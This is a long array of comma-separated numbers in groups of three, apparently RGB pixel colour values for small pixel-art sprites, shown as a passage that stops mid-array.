255, 142, 7, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 142, 7, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 142, 7, 255, 142, 7, 255, 142, 7, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 142, 7, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 0, 0, 0, 0, 0, 0, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 203, 169, 0, 0, 0, 0, 0, 0, 183, 102, 5, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 203, 169, 0, 0, 0, 0, 0, 0, 183, 102, 5, 183, 102, 5, 255, 142, 7, 255, 142, 7, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 142, 7, 255, 142, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 203, 169, 0, 0, 0, 0, 0, 0, 183, 102, 5, 183, 102, 5, 183, 102, 5, 183, 102, 5, 157, 155, 161, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 0, 0, 0, 255, 203, 169, 255, 203, 169, 0, 0, 0, 0, 0, 0, 183, 102, 5, 183, 102, 5, 183, 102, 5, 183, 102, 5, 157, 155, 161, 157, 155, 161, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 203, 169, 255, 203, 169, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 183, 102, 5, 183, 102, 5, 183, 102, 5, 183, 102, 5, 157, 155, 161, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 157, 155, 161, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 183, 102, 5, 183, 102, 5, 183, 102, 5, 183, 102, 5, 157, 155, 161, 157, 155, 161, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 255, 203, 169, 157, 155, 161, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 183, 102, 5, 183, 102, 5, 183, 102, 5, 183, 102, 5, 157, 155, 161, 157, 155, 161, 157, 155, 161, 157, 155, 161, 157, 155, 161, 157, 155, 161, 157, 155, 161, 157, 155, 161, 157, 155, 161, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 0, 0, 0, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 0, 0, 0, 0, 0, 0, 180, 83, 15, 0, 0, 0, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 180, 83, 15, 145, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 145, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 255, 255, 255, 0, 0, 125, 0, 0, 125, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 0, 0, 125, 255, 160, 214, 255, 160, 214, 255, 160, 214, 255, 160, 214, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 227, 225, 6, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 0, 0, 125, 76, 81, 81, 76, 81, 81, 255, 160, 214, 255, 160, 214, 255, 160, 214, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 160, 214, 255, 160, 214, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 227, 225, 6, 227, 225, 6, 227, 225, 6, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 0, 0, 125, 255, 255, 255, 255, 255, 255, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 227, 225, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 0, 0, 125, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 0, 0, 125, 0, 0, 125, 0, 0, 125, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 0, 0, 125, 0, 0, 125, 255, 255, 255, 0, 0, 125, 255, 255, 255, 255, 255, 255, 0, 0, 125, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 160, 214, 255, 255, 255, 0, 0, 125, 0, 0, 125, 0, 0, 125, 0, 0, 125, 0, 0, 125, 0, 0, 125, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 0, 0, 0, 255, 160, 214, 255, 255, 255, 0, 0, 125, 0, 0, 125, 0, 0, 125, 0, 0, 125, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 0, 0, 0, 255, 160, 214, 76, 81, 81, 0, 0, 125, 0, 0, 125, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 227, 225, 6, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 227, 225, 6, 227, 225, 6, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 255, 253, 7, 0, 0, 0, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 227, 225, 6, 227, 225, 6, 227, 225, 6, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 255, 253, 7, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 0, 0, 0, 255, 253, 7, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 227, 225, 6, 227, 225, 6, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 255, 253, 7, 255, 253, 7, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 227, 225, 6, 227, 225, 6, 76, 